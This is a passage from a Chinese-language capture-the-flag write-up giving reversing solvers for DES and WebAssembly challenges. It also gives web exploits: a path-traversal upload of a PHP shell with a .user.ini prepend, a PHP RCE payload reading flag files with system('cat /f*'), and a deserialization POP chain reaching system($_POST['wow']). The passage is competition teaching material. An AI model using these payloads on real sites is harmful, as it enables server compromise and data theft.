0x04000802, 0x00200802, 0x04200800,\n    0x04200802, 0x00200000, 0x00000000, 0x04000002, 0x00000002, 0x04000000, 0x04200002, 0x00000802,\n    0x04000800, 0x00200802, 0x00200002, 0x04000800, 0x04000002, 0x04200000, 0x04200800, 0x00200002,\n    0x04200000, 0x00000800, 0x00000802, 0x04200802, 0x00200800, 0x00000002, 0x04000000, 0x00200800,\n    0x04000000, 0x00200800, 0x00200000, 0x04000802, 0x04000802, 0x04200002, 0x04200002, 0x00000002,\n    0x00200002, 0x04000000, 0x04000800, 0x00200000, 0x04200800, 0x00000802, 0x00200802, 0x04200800,\n    0x00000802, 0x04000002, 0x04200802, 0x04200000, 0x00200800, 0x00000000, 0x00000002, 0x04200802,\n    0x00000000, 0x00200802, 0x04200000, 0x00000800, 0x04000002, 0x04000800, 0x00000800, 0x00200002};\nunsigned int s8[64] = {\n    0x10001040, 0x00001000, 0x00040000, 0x10041040, 0x10000000, 0x10001040, 0x00000040, 0x10000000,\n    0x00040040, 0x10040000, 0x10041040, 0x00041000, 0x10041000, 0x00041040, 0x00001000, 0x00000040,\n    0x10040000, 0x10000040, 0x10001000, 0x00001040, 0x00041000, 0x00040040, 0x10040040, 0x10041000,\n    0x00001040, 0x00000000, 0x00000000, 0x10040040, 0x10000040, 0x10001000, 0x00041040, 0x00040000,\n    0x00041040, 0x00040000, 0x10041000, 0x00001000, 0x00000040, 0x10040040, 0x00001000, 0x00041040,\n    0x10001000, 0x00000040, 0x10000040, 0x10040000, 0x10040040, 0x10000000, 0x00040000, 0x10001040,\n    0x00000000, 0x10041040, 0x00040040, 0x10000040, 0x10040000, 0x10001000, 0x10001040, 0x00000000,\n    0x10041040, 0x00041000, 0x00041000, 0x00001040, 0x00001040, 0x00040040, 0x10000000, 0x10041000};\nunsigned short word_7FF65FC70900[8] = {\n    0x0080, 0x0040, 0x0020, 0x0010, 0x0008, 0x0004, 0x0002, 0x0001};\n\nunsigned int dword_7FF65FC70910[24] = {\n    0x00800000, 0x00400000, 0x00200000, 0x00100000, 0x00080000, 0x00040000, 0x00020000, 0x00010000,\n    0x00008000, 0x00004000, 0x00002000, 0x00001000, 0x00000800, 0x00000400, 0x00000200, 0x00000100,\n    0x00000080, 0x00000040, 0x00000020, 0x00000010, 0x00000008, 0x00000004, 0x00000002, 0x00000001};\nunsigned char byte_7FF65FC70970[56] = {\n    0x38, 0x30, 0x28, 0x20, 0x18, 0x10, 0x08, 0x00, 0x39, 0x31, 0x29, 0x21, 0x19, 0x11, 0x09, 0x01,\n    0x3A, 0x32, 0x2A, 0x22, 0x1A, 0x12, 0x0A, 0x02, 0x3B, 0x33, 0x2B, 0x23, 0x3E, 0x36, 0x2E, 0x26,\n    0x1E, 0x16, 0x0E, 0x06, 0x3D, 0x35, 0x2D, 0x25, 0x1D, 0x15, 0x0D, 0x05, 0x3C, 0x34, 0x2C, 0x24,\n    0x1C, 0x14, 0x0C, 0x04, 0x1B, 0x13, 0x0B, 0x03};\nunsigned char byte_7FF65FC709A8[16] = {\n    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10};\n\nvoid __fastcall des_encrypt(unsigned int *a1, DWORD *a2)\n{\n    unsigned int left = a1[1];\n    unsigned int right = a1[0];\n\n    unsigned int temp = (left ^ (right >> 4)) & 0xF0F0F0F;\n    left = temp ^ left;\n    right = (temp << 4) ^ right;\n\n    temp = (left ^ (right >> 16)) & 0x0000FFFF;\n    left = temp ^ left;\n    right = (temp << 16) ^ right;\n\n    temp = (right ^ (left >> 2)) & 0x33333333;\n    right = temp ^ right;\n    left = (temp << 2) ^ left;\n\n    temp = (right ^ (left >> 8)) & 0x00FF00FF;\n    right = temp ^ right;\n    left = (((temp << 8) ^ left) >> 31) | (2 * ((temp << 8) ^ left));\n\n    temp = (left ^ right) & 0xAAAAAAAA;\n    left = temp ^ left;\n    right = ((temp ^ right) >> 31) | (2 * (temp ^ right));\n\n    for (int i = 0; i < 8; i++)\n    {\n        temp = *a2++ ^ ((left >> 4) | (left << 28));\n        unsigned int result1 = s1[(temp >> 24) & 0x3F] |\n                               s3[(temp >> 16) & 0x3F] |\n                               s5[(temp >> 8) & 0x3F] |\n                               s7[temp & 0x3F];\n        temp = *a2++ ^ left;\n\n        right ^= s2[(temp >> 24) & 0x3F] |\n                 s4[(temp >> 16) & 0x3F] |\n                 s6[(temp >> 8) & 0x3F] |\n                 s8[temp & 0x3F] |\n                 result1;\n\n        temp = *a2++ ^ ((right >> 4) | (right << 28));\n        result1 = s1[(temp >> 24) & 0x3F] |\n                  s3[(temp >> 16) & 0x3F] |\n                  s5[(temp >> 8) & 0x3F] |\n                  s7[temp & 0x3F];\n\n        temp = *a2++ ^ right;\n        left ^= s2[(temp >> 24) & 0x3F] |\n                s4[(temp >> 16) & 0x3F] |\n                s6[(temp >> 8) & 0x3F] |\n                s8[temp & 0x3F] |\n                result1;\n    }\n    left = (left >> 1) | (left << 31);\n    temp = (left ^ right) & 0xAAAAAAAA;\n    left = temp ^ left;\n    right = ((temp ^ right) >> 1) | ((temp ^ right) << 31);\n\n    temp = (left ^ (right >> 8)) & 0xFF00FF;\n    left = temp ^ left;\n    right = (temp << 8) ^ right;\n\n    temp = (left ^ (right >> 2)) & 0x33333333;\n    left = temp ^ left;\n    right = (temp << 2) ^ right;\n\n    temp = (right ^ (left >> 16)) & 0xFFFF;\n    right = temp ^ right;\n    left = (temp << 16) ^ left;\n\n    temp = (right ^ (left >> 4)) & 0x0F0F0F0F;\n\n    a1[0] = (temp << 4) ^ left;\n    a1[1] = temp ^ right;\n}\n\nint main()\n{\n    unsigned int key[64] = {\n        0x2C0B3C36, 0x09221A0A, 0x2829051D, 0x09123B0D, 0x2C091B18, 0x0512011F, 0x09292E17, 0x07122920,\n        0x090D1703, 0x0514372E, 0x0915123C, 0x27100E27, 0x01050927, 0x25150D29, 0x13151F32, 0x24112618,\n        0x03052031, 0x34312B37, 0x13043A05, 0x3C19151B, 0x23063B3E, 0x34293830, 0x03062108, 0x380B3F2A,\n        0x260E063D, 0x3009141B, 0x0E223D3D, 0x300B0124, 0x062A1700, 0x11093D14, 0x0E22262B, 0x1208083E,\n        0x0E22262B, 0x1208083E, 0x062A1700, 0x11093D14, 0x0E223D3D, 0x300B0124, 0x260E063D, 0x3009141B,\n        0x03062108, 0x380B3F2A, 0x23063B3E, 0x34293830, 0x13043A05, 0x3C19151B, 0x03052031, 0x34312B37,\n        0x13151F32, 0x24112618, 0x01050927, 0x25150D29, 0x0915123C, 0x27100E27, 0x090D1703, 0x0514372E,\n        0x09292E17, 0x07122920, 0x2C091B18, 0x0512011F, 0x2829051D, 0x09123B0D, 0x2C0B3C36, 0x09221A0A};\n\n    unsigned int data[64] = {\n        0x00000084, 0x0000008B, 0x00000003, 0x00000022, 0x00000014, 0x000000BE, 0x000000DF, 0x00000075,\n        0x000000B3, 0x000000D5, 0x00000076, 0x0000006F, 0x000000CD, 0x0000002A, 0x0000005D, 0x000000D7,\n        0x0000004D, 0x000000B2, 0x0000005F, 0x00000006, 0x00000098, 0x0000009D, 0x0000003E, 0x000000A8,\n        0x000000F7, 0x00000023, 0x000000F2, 0x0000008B, 0x000000F2, 0x00000054, 0x00000065, 0x0000007A,\n        0x00000020, 0x000000C0, 0x00000087, 0x00000055, 0x000000D6, 0x0000003B, 0x00000046, 0x0000003D,\n        0x000000F7, 0x000000B2, 0x0000007A, 0x0000009D, 0x000000C2, 0x000000CF, 0x0000001A, 0x000000AE,\n        0x00000016, 0x000000C7, 0x00000015, 0x00000030, 0x0000008E, 0x000000FD, 0x0000008F, 0x0000009E,\n        0x000000AA, 0x00000039, 0x000000AB, 0x000000FE, 0x00000095, 0x000000A7, 0x0000001F, 0x000000F1};\n\n    unsigned char Enc[64]{};\n    for (int i = 0; i < 64; i++)\n        Enc[i] = data[i];\n\n    // 四字节一组翻转\n    for (int i = 0; i < 64; i += 4)\n    {\n        auto a = Enc[i], b = Enc[i + 1], c = Enc[i + 2], d = Enc[i + 3];\n        Enc[i] = d;\n        Enc[i + 1] = c;\n        Enc[i + 2] = b;\n        Enc[i + 3] = a;\n    }\n    \n    // DES解密（用后32个key）\n    for (int i = 0; i < 64; i += 8)\n        des_encrypt((unsigned int *)(Enc + i), (DWORD *)(key + 32));\n\n    // 四字节一组翻转\n    for (int i = 0; i < 64; i += 4)\n    {\n        auto a = Enc[i], b = Enc[i + 1], c = Enc[i + 2], d = Enc[i + 3];\n        Enc[i] = d;\n        Enc[i + 1] = c;\n        Enc[i + 2] = b;\n        Enc[i + 3] = a;\n    }\n\n    printf(\"HZNUCTF{\");\n    // 逆向初始字符串变换\n    for (int i = 0; i < 64; i += 4)\n    {\n        std::string tmp1;\n        tmp1 += Enc[i];\n        tmp1 += Enc[i + 2];\n\n        std::string tmp2;\n        tmp2 += Enc[i + 1];\n        tmp2 += Enc[i + 3];\n\n        printf(\"%c\", char(std::stoi(tmp1, 0, 16)));\n        printf(\"%c\", char(std::stoi(tmp2, 0, 16)));\n    }\n\n    printf(\"}\\n\");\n\n    return 0;\n}\n```\n\nHZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}\n\n### Index\n\n下载附件发现wasm文件开头字节和正常wasm文件不一样，复制修复即可。\n\n左题目附件，右正常wasm文件。\n\n![img](/images/1744633170178-32.png)\n\n使用ghidra进行分析，因为有专门的wasm反编译插件。\n\n通过Exports定位到main函数，以下是经过我重命名后的结果。\n\n![img](/images/1744633170178-33.png)\n\n首先是输入key，然后判断和该处明文是否相等。\n\n然后将Key xor上0x51。\n\n![img](/images/1744633170178-34.png)\n\n![img](/images/1744633170178-35.png)\n\n第一步加密，置了随机数种子0x194，然后用随机数打乱输入的字符串，再转存到另一个Out数组。\n\n![img](/images/1744633170178-36.png)\n\n![img](/images/1744633170179-37.png)\n\n第二步加密（四个字节一组加密）：\n\n1. 用key获取到两个值，然后全局数值iRam0001120++，每次加密都+1，初始值是0。\n2. 调用一个函数将0x10ea0处数据异或上0x10da0取下标的对应值。\n3. 再将输入字符串异或上0x10ea0对应下标数据以及0x11020对应下标数据，0x11020处数据就是原Key字符串**\"TGCTF404\"**。\n\n![img](/images/1744633170179-38.png)\n\n![img](/images/1744633170179-39.png)\n\n最后再与0x10fa0处数据进行比对，所以0x10fa0处就是加密后的flag。\n\n![img](/images/1744633170179-40.png)\n\n导出0x10ea0和0x10da0数据，编写以上代码的逆向解密代码即可。\n\n解密代码：\n\n```Cpp\n#include <iostream>\n#include <Windows.h>\n\n// 0x10da0处数据\nunsigned char box[] = {\n    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,\n    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,\n    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,\n    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,\n    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,\n    0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,\n    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,\n    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,\n    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,\n    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,\n    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,\n    0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,\n    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,\n    0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,\n    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,\n    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,\n    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,\n    0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,\n    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,\n    0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,\n    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,\n    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,\n    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,\n    0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,\n    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,\n    0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,\n    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,\n    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,\n    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,\n    0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,\n    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,\n    0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16};\n    \n// 0x10ea0处数据\nunsigned char box_ori[] = {\n    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,\n    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,\n    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,\n    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,\n    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,\n    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,\n    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,\n    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,\n    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,\n    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,\n    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,\n    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,\n    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,\n    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,\n    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,\n    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48};\n    \nvoid unnamed_function_10(byte *param1, int param2)\n{\n    for (int i = 0; i < 0x100; i = i + 1)\n    {\n        param1[i] = param1[i] ^ (byte)param2;\n    }\n    return;\n}\n\nunsigned char Enc[] = {\n    0x84, 0x00, 0x00, 0x00,\n    0x1c, 0x00, 0x00, 0x00,\n    0x6b, 0x00, 0x00, 0x00,\n    0xf7, 0x00, 0x00, 0x00,\n    0x49, 0x00, 0x00, 0x00,\n    0x22, 0x00, 0x00, 0x00,\n    0xd6, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0x50, 0x00, 0x00, 0x00,\n    0x7b, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0xf4, 0x00, 0x00, 0x00,\n    0x46, 0x00, 0x00, 0x00,\n    0xa9, 0x00, 0x00, 0x00,\n    0x83, 0x00, 0x00, 0x00,\n    0x62, 0x00, 0x00, 0x00,\n    0xd1, 0x00, 0x00, 0x00,\n    0x32, 0x00, 0x00, 0x00,\n    0x80, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0x6a, 0x00, 0x00, 0x00,\n    0x10, 0x00, 0x00, 0x00,\n    0xa3, 0x00, 0x00, 0x00,\n    0xf2, 0x00, 0x00, 0x00,\n    0xe2, 0x00, 0x00, 0x00,\n    0xb8, 0x00, 0x00, 0x00,\n    0x0b, 0x00, 0x00, 0x00,\n    0x76, 0x00, 0x00, 0x00,\n    0xb0, 0x00, 0x00, 0x00,\n    0xdc, 0x00, 0x00, 0x00,\n    0x02, 0x00, 0x00, 0x00,\n    0x51, 0x00, 0x00, 0x00};\n\nvoid Dec_2(unsigned char *Input, unsigned char *Key)\n{\n    static int c = 0;\n    int iVar1 = (int)Key[c] >> 4;\n    DWORD uVar2 = (int)Key[c] & 0xf;\n    c++;\n    unnamed_function_10(box_ori, (int)*(char *)(iVar1 * 0x10 + (unsigned char *)box + uVar2));\n    unsigned char key_o[] = \"TGCTF404\";\n    for (int i = 0; i < 4; i++)\n    {\n        Input[i] = Input[i] ^ box_ori2[iVar1 * 0x10 + i * 0x11 + uVar2];\n        Input[i] = Input[i] ^ key_o[i];\n    }\n}\n\nvoid decrypt(unsigned char *Input, int length)\n{\n    unsigned char Key[] = \"TGCTF404\";\n\n    for (int i = 0; i < 8; i++)\n        Key[i] ^= 0x51;\n\n    for (int i = 0; i < length; i += 4)\n    {\n        Dec_2((unsigned char *)(Input + i), Key);\n    }\n\n    srand(0x194);\n\n    int swaps[32][2];\n    for (int i = 0; i < 32; i++)\n    {\n        auto Value = rand();\n        Value = i + Value / (0x7fff / (32 - i) + 1);\n        swaps[i][0] = i;\n        swaps[i][1] = Value;\n    }\n\n    for (int i = 31; i >= 0; i--)\n    {\n        unsigned char temp = Input[swaps[i][0]];\n        Input[swaps[i][0]] = Input[swaps[i][1]];\n        Input[swaps[i][1]] = temp;\n    }\n}\n\nint main()\n{\n    unsigned char Key[] = \"TGCTF404\";\n    unsigned char Enc_flag[32]{};\n    \n    for (int i = 0; i < 32; i++)\n        Enc_flag[i] = *(int *)((byte *)Enc + i * 4);\n\n    decrypt(Enc_flag, 32);\n\n    printf(\"%.32s\\n\", Enc_flag);\n    return 0;\n}\n```\n\nHZNUCTF{f898-de85-46e-9e43-b9c8}\n\n## Web\n\n### (ez)upload\n\n扫目录 有 upload.php.bak 翻源码。name处存在穿越。\n\n可以上传.user.ini。而只有上级目录有php文件可以触发。\n\n因此。我们传图片马和.user.ini到上级目录。等待触发即可。\n\npayload：\n\n```http\nPOST /upload.php?name=../evil.png HTTP/1.1\nHost: node1.tgctf.woooo.tech:32690\nContent-Length: 320\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://node1.tgctf.woooo.tech:32690\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://node1.tgctf.woooo.tech:32690/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\nContent-Disposition: form-data; name=\"name\"; filename=\"1.png\"\nContent-Type: application/octet-stream\n\n<?php phpinfo();?>\n\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\nContent-Disposition: form-data; name=\"submit\"\n\n上传文件\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ--\nPOST /upload.php?name=../.user.ini HTTP/1.1\nHost: node1.tgctf.woooo.tech:32690\nContent-Length: 335\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://node1.tgctf.woooo.tech:32690\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://node1.tgctf.woooo.tech:32690/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\nContent-Disposition: form-data; name=\"name\"; filename=\".user.ini\"\nContent-Type: application/octet-stream\n\nauto_prepend_file=evil.png\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\nContent-Disposition: form-data; name=\"submit\"\n\n上传文件\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ--\n```\n\n在phpinfo的$_SERVER['FLAG']里看到flag\n\n### AAA偷渡阴平\n\n无参数RCE绕过。\n\npayload：\n\n```http\nGET /?tgctf2025=eval(end(current(get_defined_vars())));&b=system('cat /f*'); HTTP/1.1\nHost: node1.tgctf.woooo.tech:30815\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nCUIASDGHFIOUWE: 123123\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n```\n\n### 什么文件上传？\n\nrobots.txt 进去有 class.php 一眼就能瞪出来pop链子。\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass yesterday {\n    public $learn;\n    public $study=\"study\";\n    public $try;\n    public function __construct()\n    {\n        $this->learn = \"learn<br>\";\n    }\n    public function __destruct()\n    {\n        echo \"You studied hard yesterday.<br>\";\n        return $this->study->hard();\n    }\n}\nclass today {\n    public $doing;\n    public $did;\n    public $done;\n    public function __construct(){\n        $this->did = \"What you did makes you outstanding.<br>\";\n    }\n    public function __call($arg1, $arg2)\n    {\n        $this->done = \"And what you've done has given you a choice.<br>\";\n        echo $this->done;\n        if(md5(md5($this->doing))==666){\n            return $this->doing();\n        }\n        else{\n            return $this->doing->better;\n        }\n    }\n}\nclass tommoraw {\n    public $good;\n    public $bad;\n    public $soso;\n    public function __invoke(){\n        $this->good=\"You'll be good tommoraw!<br>\";\n        echo $this->good;\n    }\n    public function __get($arg1){\n        $this->bad=\"You'll be bad tommoraw!<br>\";\n    }\n\n}\nclass future{\n    private $impossible=\"How can you get here?<br>\";\n    private $out;\n    private $no;\n    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;\n\n    public function __set($arg1, $arg2) {\n        if ($this->out->useful7) {\n            echo \"Seven is my lucky number<br>\";\n            system('whoami');\n        }\n    }\n    public function __toString(){\n        echo \"This is your future.<br>\";\n        system($_POST[\"wow\"]);\n        return \"win\";\n    }\n    public function __destruct(){\n        $this->no = \"no\";\n        return $this->no;\n    }\n}\n$evil = new yesterday();\n$evil -> study = new today();\n$evil -> study -> doing = new future();\n```\n\n随后序列化evil。base64四次。随后上传文件通过file_exists的检查即可。\n\n```http\nPOST /upload.php HTTP/1.1\nHost: node1.tgctf.woooo.tech:32439\nContent-Length: 5437\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://node1.tgctf.woooo.tech:32439\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryurqPJUpE3whNwI5B\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://node1.tgctf.woooo.tech:32439/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundaryurqPJUpE3whNwI5B\nContent-Disposition: form-data; name=\"Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJ